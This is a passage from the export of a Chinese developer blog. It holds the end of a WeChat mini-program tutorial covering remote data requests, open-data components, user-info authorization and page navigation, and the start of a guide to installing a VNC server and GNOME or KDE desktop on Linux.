class="attr">inputValue</span>:event.<span class="property">detail</span>.<span class="property">value</span> || <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="title function_">buttonHandler</span>(<span class="params">event</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> newItem = <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">inputValue</span>.<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">if</span>(!newItem) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">const</span> itemArr = [...<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">items</span>, newItem];</span><br><span class="line">        wx.<span class="title function_">setStorageSync</span>(<span class="string">&#x27;items&#x27;</span>, itemArr);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            <span class="attr">items</span>:itemArr</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生命周期函数--监听页面加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> that = <span class="variable language_">this</span>;</span><br><span class="line">        wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/items&#x27;</span>,</span><br><span class="line">        <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">            that.<span class="title function_">setData</span>(&#123; <span class="attr">items</span>: res.<span class="property">data</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，生命周期方法<code>onLoad()</code>会在页面加载后自动执行，这时就会执行<code>wx.request()</code>方法去请求远程数据。如果请求成功，就会执行回调函数<code>succcess()</code>，更新页面全局变量<code>items</code>，从而让远程数据显示在页面上。</p><p><code>wx.request()</code>方法就是小程序的网络请求 API，通过它可以发送 HTTP 请求。它的参数配置对象最少需要指定<code>url</code>属性（请求的网址）和<code>succcess()</code>方法（服务器返回数据的处理函数）。其他参数请参考<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/api/network/request/wx.request.html">官方文档</a>。</p><p>开发者工具导入项目代码，页面渲染结果如下。它的初始数据是从服务器拿到的。</p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118121429947.png" alt="image-20220118121429947" style="zoom:50%;" /><p>这个例子只实现了远程数据获取，json-server 实际上还支持数据的新增和删改。</p><h2 id="0x04-组件"><a href="#0x04-组件" class="headerlink" title="0x04 组件"></a>0x04 <open-data>组件</h2><p>如果要在页面上展示当前用户的身份信息，可以使用小程序提供的<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/component/open-data.html"><code>&lt;open-data&gt;</code>组件</a>。</p><p>在<code>app.json</code>中新建<code>page</code>:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;pages/openData/opendata&quot;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>保存后项目中会自动为你创建<code>page</code>文件夹:</p><p>​    ![image-20220118122210964](&#x2F;Users&#x2F;q1jun&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220118122210964.png)</p><p>打开<code>opendata.wxml</code>文件，代码修改如下。    </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">open-data</span> <span class="attr">type</span>=<span class="string">&quot;userAvatarUrl&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">open-data</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">open-data</span> <span class="attr">type</span>=<span class="string">&quot;userNickName&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">open-data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>&lt;open-data&gt;</code>组件的<code>type</code>属性指定所要展示的信息类型，<code>userAvatarUrl</code>表示展示用户头像，<code>userNickName</code>表示用户昵称。</p><p>开发者工具导入项目代码，页面渲染结果如下，显示你的头像和用户昵称。</p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118121848684.png" alt="image-20220118121848684" style="zoom:50%;" /><p><code>&lt;open-data&gt;</code>支持的用户信息如下。</p><blockquote><ul><li><code>userNickName</code>：用户昵称</li><li><code>userAvatarUrl</code>：用户头像</li><li><code>userGender</code>：用户性别</li><li><code>userCity</code>：用户所在城市</li><li><code>userProvince</code>：用户所在省份</li><li><code>userCountry</code>：用户所在国家</li><li><code>userLanguage</code>：用户的语言</li></ul></blockquote><p><code>&lt;open-data&gt;</code>不需要用户授权，也不需要登录，所以用起来很方便。但也是因为这个原因，小程序不允许用户脚本读取<code>&lt;open-data&gt;</code>返回的信息。</p><h2 id="0x05-获取用户个人信息"><a href="#0x05-获取用户个人信息" class="headerlink" title="0x05 获取用户个人信息"></a>0x05 获取用户个人信息</h2><p>如果想拿到用户的个人信息，必须得到授权。官方建议，通过按钮方式获取授权。</p><p>在<code>app.json</code>中新建<code>page</code>:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;pages/user/user&quot;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>打开<code>user.wxml</code>文件，代码修改如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--pages/user/user.<span class="property">wxml</span>--&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">text</span>&gt;</span>pages/user/user.wxml<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line">&lt;!-- 如果只是展示用户头像昵称，可以使用 &lt;open-data /&gt; 组件 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">open-data</span> <span class="attr">type</span>=<span class="string">&quot;userAvatarUrl&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">open-data</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">open-data</span> <span class="attr">type</span>=<span class="string">&quot;userNickName&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">open-data</span>&gt;</span></span></span><br><span class="line">&lt;!-- 需要使用 button 来授权登录 --&gt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;text class=&quot;title&quot;&gt;hello &#123;&#123;userInfo&#125;&#125;&lt;/text&gt;&#x27;</span></span><br><span class="line">&lt;button <span class="attr">wx</span>:<span class="keyword">if</span>=<span class="string">&quot;&#123;&#123;canIUse&#125;&#125;&quot;</span> open-type=<span class="string">&quot;getUserInfo&quot;</span> <span class="attr">bind</span>:getuserinfo=<span class="string">&quot;bindGetUserInfo&quot;</span>&gt;授权登录&lt;/button&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:else</span>&gt;</span>请升级微信版本<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>&lt;button&gt;</code>标签的<code>open-type</code>属性，指定按钮用于获取用户信息，<code>bind:getuserinfo</code>属性表示点击按钮会触发<code>getuserinfo</code>事件，即跳出对话框，询问用户是否同意授权。</p><p>用户点击”允许”，脚本就可以得到用户信息。</p><p><code>user.js</code>文件的脚本代码如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">canIUse</span>: wx.<span class="title function_">canIUse</span>(<span class="string">&#x27;button.open-type.getUserInfo&#x27;</span>),</span><br><span class="line">        <span class="attr">userInfo</span>: <span class="string">&#x27;Guest&#x27;</span></span><br><span class="line">      &#125;,</span><br><span class="line">  bindGetUserInfo (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">detail</span>.<span class="property">userInfo</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            <span class="attr">userInfo</span>:e.<span class="property">detail</span>.<span class="property">userInfo</span>.<span class="property">nickName</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  <span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">        <span class="comment">// const that = this;</span></span><br><span class="line">        wx.<span class="title function_">getSetting</span>(&#123;</span><br><span class="line">            success (res)&#123;</span><br><span class="line">              <span class="keyword">if</span> (res.<span class="property">authSetting</span>[<span class="string">&#x27;scope.userInfo&#x27;</span>]) &#123;</span><br><span class="line">                <span class="comment">// 已经授权，可以直接调用 getUserInfo 获取头像昵称</span></span><br><span class="line">                wx.<span class="title function_">getUserInfo</span>(&#123;</span><br><span class="line">                  <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">userInfo</span>);</span><br><span class="line">                    <span class="comment">// that.setData(&#123;userInfo : res.userInfo&#125;);</span></span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>bindGetUserInfo</code>是按钮点击的监听函数，不管用户点击”拒绝”或”允许”，都会执行这个函数。我们可以通过事件对象<code>e</code>有没有<code>e.detail.userInfo</code>属性，来判断用户点击了哪个按钮。如果能拿到<code>e.detail.userInfo</code>属性，就表示用户允许读取个人信息。这个属性是一个对象，里面就是各种用户信息，比如头像、昵称等等。</p><p>实际开发中，可以先用<code>wx.getSetting()</code>方法判断一下，用户是否已经授权过。如果已经授权过，就不用再次请求授权，而是直接用<code>wx.getUserInfo()</code>方法获取用户信息。</p><p>注意，这种方法返回的用户信息之中，不包括能够真正识别唯一用户的<code>openid</code>属性。这个属性需要用到保密的小程序密钥去请求，所以不能放在前端获取，而要放在后端。这里就不涉及了。</p><h2 id="0x06-多页面的跳转"><a href="#0x06-多页面的跳转" class="headerlink" title="0x06 多页面的跳转"></a>0x06 多页面的跳转</h2><p>真正的小程序不会只有一个页面，而是多个页面，所以必须能在页面之间实现跳转。</p><p><code>app.json</code>配置文件的<code>pages</code>属性就用来指定小程序有多少个页面。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;pages/user/user&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;pages/openData/opendata&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;pages/home/home&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;pages/wxml/index&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;pages/index/index&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;pages/logs/logs&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;window&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;backgroundTextStyle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;navigationBarBackgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#000&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;navigationBarTitleText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MiniProgram&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;navigationBarTextStyle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;white&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sitemapLocation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sitemap.json&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>pages</code>数组包含两个页面。以后每新增一个页面，都必须把页面路径写在<code>pages</code>数组里面，否则就是无效页面。排在第一位的页面，就是小程序打开时，默认展示的页面。</p><p><strong>第一步:</strong></p><p>在<code>app.json</code>中的<code>pages</code>中添加第一行数据：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;pages/direct/direct&quot;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>按保存，就能加载出对应page文件：</p><p>![image-20220118124849413](&#x2F;Users&#x2F;q1jun&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220118124849413.png)</p><p><strong>第二步：</strong></p><p>修改页面文件<code>direct.wxml</code>，代码如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--pages/direct/direct.wxml--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span>pages/direct/direct.wxml<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>这是direct<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">class</span>=<span class="string">&quot;weui-btn weui-btn_primary&quot;</span> <span class="attr">url</span>=<span class="string">&quot;../user/user&quot;</span>&gt;</span>查看用户信息<span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>&lt;navigator&gt;</code>就是链接标签，相当于网页标签<code>&lt;a&gt;</code>，只要用户点击就可以跳转到<code>url</code>属性指定的页面（这里是direct的位置）。</p><p><strong>第三步：</strong></p><p>添加以下代码到<code>user.wxml</code>，让用户能返回<code>direct</code>页面中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">class</span>=<span class="string">&quot;weui-btn weui-btn_primary&quot;</span> <span class="attr">url</span>=<span class="string">&quot;../direct/direct&quot;</span>&gt;</span>前往direct<span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终页面渲染结果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118125806956.png" alt="image-20220118125806956"></p><p>点击按钮后：</p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118125826417.png" alt="image-20220118125826417" style="zoom:50%;" /><p>实现了页面间的跳转。</p><h2 id="0x07-wx-navigateTo-通过js实现页面跳转"><a href="#0x07-wx-navigateTo-通过js实现页面跳转" class="headerlink" title="0x07 wx.navigateTo()通过js实现页面跳转"></a>0x07 wx.navigateTo()通过js实现页面跳转</h2><p>除了<strong>0x06</strong>中的方式，还可以通过<code>wx.navigateTo()</code>实现页面间的跳转。</p><p>首先和<strong>0x06</strong>一样创建一个新的页面<code>pages/direct1/direct1</code>修改<code>direct1.wxml</code>文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>这是首页<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;weui-btn weui-btn_primary&quot;</span> <span class="attr">bind:tap</span>=<span class="string">&quot;buttonHandler&quot;</span>&gt;</span>前往第二页<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>导入项目代码，页面渲染结果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220118135249730.png" alt="image-20220118135249730"></p><p>然后，打开<code>direct1.js</code>文件，代码修改如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="title function_">buttonHandler</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    wx.<span class="title function_">navigateTo</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&#x27;../user/user&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>buttonHandler()</code>是按钮点击的监听函数，只要用户点击按钮，就会调用<code>wx.navigateTo()</code>方法。该方法的参数是一个配置对象，该对象的<code>url</code>属性指定了跳转目标的位置，自动跳转到那个页面。</p>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 小程序 </tag>
            
            <tag> WeChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Linux中安装VNC和图形化界面</title>
      <link href="/2021/09/06/d57be45e2593-q1jun/"/>
      <url>/2021/09/06/d57be45e2593-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="在Linux中安装VNC和图形化界面"><a href="#在Linux中安装VNC和图形化界面" class="headerlink" title="在Linux中安装VNC和图形化界面"></a>在Linux中安装VNC和图形化界面</h1><p>在linux机器上安装vnc服务端，然后通过本地windows机器的vnc客户端工具去连接到服务端，这样操作linux机器就能以界面化方式操作，连接到远程linux机。</p><p>连接到远程linux机器后的服务器显示效果如图：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC1.png"></p><p>下面就具体步骤详细讲解：</p><h2 id="一：确认VNC服务是否有安装"><a href="#一：确认VNC服务是否有安装" class="headerlink" title="一：确认VNC服务是否有安装"></a>一：确认VNC服务是否有安装</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -<span class="keyword">qa</span>|<span class="keyword">grep</span> tigervnc</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC.jpg" alt="img"></p><p>发现显示已经安装过vnc，说明已经安装过vnc服务了</p><p>如果显示没有安装，如下图：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC2.jpg" alt="img"></p><p>这里提供两种安装方式：</p><ul><li><p>rpm包安装</p><p>此法最好用在有系统安装包的基础上，如redhat-Linux.5.5.for.x86-server-5.5 系统.iso包，打开后在Server目录下有两个包</p></li></ul><p>​    <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC3.png" alt="img"><br>　　　上传vnc-server包就行了，然后运行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　　<span class="attribute">rpm</span> -ivh vnc-server-<span class="number">4</span>.<span class="number">1</span>.<span class="number">2</span>-<span class="number">14</span>.el5.<span class="number">3</span>.<span class="number">1</span>.i386.rpm</span><br></pre></td></tr></table></figure><p>　　　来安装vnc服务，此法可以避免vnc版本与系统不一致的问题，因为是从系统里找的vnc的文件，但是iso文件难以获得，一般找这个</p><p>　　　rpm文件都是要通过百度来找，寻找系统版本的vnc的rpm包来安装。否则因为版本不一致会导致后续很多问题。</p><ul><li>yum命令安装(推荐方式)</li></ul><p>　　　此法比较简单，直接使用yum命令即可：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　　yum -y install tigervnc-<span class="keyword">server</span></span><br></pre></td></tr></table></figure><p>　　　它会自动给你下载依赖包，如果你的yum命令不能使用，建议用如下命令：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　　echo nameserver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> &gt;&gt; <span class="regexp">/etc/</span>resolv.conf</span><br></pre></td></tr></table></figure><p>　　　然后在用yum命令即可。</p><h2 id="二：启动vnc服务"><a href="#二：启动vnc服务" class="headerlink" title="二：启动vnc服务"></a>二：启动vnc服务</h2><p>使用vncserver命令启动VNC服务，命令格式为”vncserver :桌面号”，其中”桌面号”用”数字”的方式表示，每个用户连个需要占用1个桌面</p><p>启动编号为1的桌面示例如下:</p><p>命令为 vncserver :1 (注意vncserver与:之间有空格)</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC4.jpg" alt="img"></p><p>以上命令执行的过程中，因为是第一次执行，需要输入密码，这个密码被加密保存在用户主目录下的.vnc子目录（&#x2F;root&#x2F;.vnc&#x2F;passwd）中；同时在用户主目录下的.vnc子目录中为用户自动建立xstartup配置文件（&#x2F;root&#x2F;.vnc&#x2F;xstartup），在每次启动VND服务时，都会读取该文件中的配置信息。另外需注意的是这里设置的密码就是后面我们用vncserver客户端工具连接时要输入的密码。</p><p>BTW：&#x2F;root&#x2F;.vnc&#x2F;目录下还有一个“主机名:1.pid”文件，这个文件记录着启动VNC后对应后面操作系统的进程号，用于停止VNC服务时准确定位进程号。</p><p>这样vnc服务端就启动成功了，这里是用root用户执行的vncserver :1命令，则启动后用vncserver客户端连接进入到该服务器的用户就是root用户，</p><p>如果用root用户安装后，用aiuap用户(其他的用户)启动：则vncserver客户端连接进入到该服务器的用户就是aiuap用户</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC5.jpg" alt="img"></p><h2 id="三：vnc服务使用的端口号与桌面号的关系"><a href="#三：vnc服务使用的端口号与桌面号的关系" class="headerlink" title="三：vnc服务使用的端口号与桌面号的关系"></a>三：vnc服务使用的端口号与桌面号的关系</h2><p>VNC服务使用的端口号与桌面号相关，VNC使用TCP端口从5900开始，对应关系如下<br>桌面号为“1” —- 端口号为5901<br>桌面号为“2” —- 端口号为5902<br>桌面号为“3” —- 端口号为5903<br>……<br>基于Java的VNC客户程序Web服务TCP端口从5800开始，也是与桌面号相关，对应关系如下<br>桌面号为“1” —- 端口号为5801<br>桌面号为“2” —- 端口号为5802<br>桌面号为“3” —- 端口号为5803<br>……<br>基于上面的介绍，如果Linux开启了防火墙功能，就需要手工开启相应的端口，以开启桌面号为“1”相应的端口为例，命令如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@xxxxx ~]</span># iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp <span class="attr">--dport</span> <span class="number">5901</span> -j ACCEPT</span><br><span class="line"><span class="selector-attr">[root@xxxxx ~]</span># iptables -<span class="selector-tag">I</span> <span class="selector-tag">INPUT</span> -<span class="selector-tag">p</span> tcp <span class="attr">--dport</span> <span class="number">5801</span> -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="四：配置VNC图形桌面环境为KDE或GNOME桌面环境"><a href="#四：配置VNC图形桌面环境为KDE或GNOME桌面环境" class="headerlink" title="四：配置VNC图形桌面环境为KDE或GNOME桌面环境"></a>四：配置VNC图形桌面环境为KDE或GNOME桌面环境</h2><p>如果您是按照我的上面方法进行的配置的，登陆到桌面后效果是非常简单的，只有一个Shell可供使用，这是为什么呢？怎么才能看到可爱并且美丽的KDE或GNOME桌面环境呢？<br>之所以那么的难看，是因为VNC服务默认使用的是twm图形桌面环境的，可以在VNC的配置文件xstartup中对其进行修改，先看一下这个配置文件：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@xxxx</span><span class="number">-145</span> ~]<span class="meta">#  vi /root/.vnc/xstartup</span></span><br></pre></td></tr></table></figure><p>可以看到最后一行为：twm &amp;</p><p>将这个xstartup文件的最后一行修改为“startkde &amp;”，再重新启动vncserver服务后就可以登陆到KDE桌面环境</p><p>将这个xstartup文件的最后一行修改为“gnome-session &amp;”，再重新启动vncserver服务后就可以登陆到GNOME桌面环境，</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC6.jpg" alt="img"></p><p>如果连接vnc后发现为黑屏，原因是没有安装GNOME Desktop Environment，使用</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$sudo</span>  yum groupinstall <span class="string">&quot;GNOME Desktop&quot;</span> <span class="string">&quot;Graphical Administration Tools&quot;</span></span><br></pre></td></tr></table></figure><p>即可安装GNOME Desktop Environment，安装完成后可重启vnc服务即执行vncserver -kill :1，在执行vncserver :1，再次进入发现出现屏幕画面。</p><p>如果发现执行该命令报错, 可执行如下命令安装：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum clean <span class="keyword">all</span></span><br><span class="line"></span><br><span class="line">yum groupinstall <span class="string">&quot;X Window System&quot;</span> <span class="string">&quot;Desktop&quot;</span></span><br><span class="line"></span><br><span class="line">yum -y install gnome*</span><br></pre></td></tr></table></figure><p>即可安装GNOME Desktop Environment，安装完成后可重启vnc服务即执行vncserver -kill :1，在执行vncserver :1，再次进入发现出现屏幕画面。</p><h2 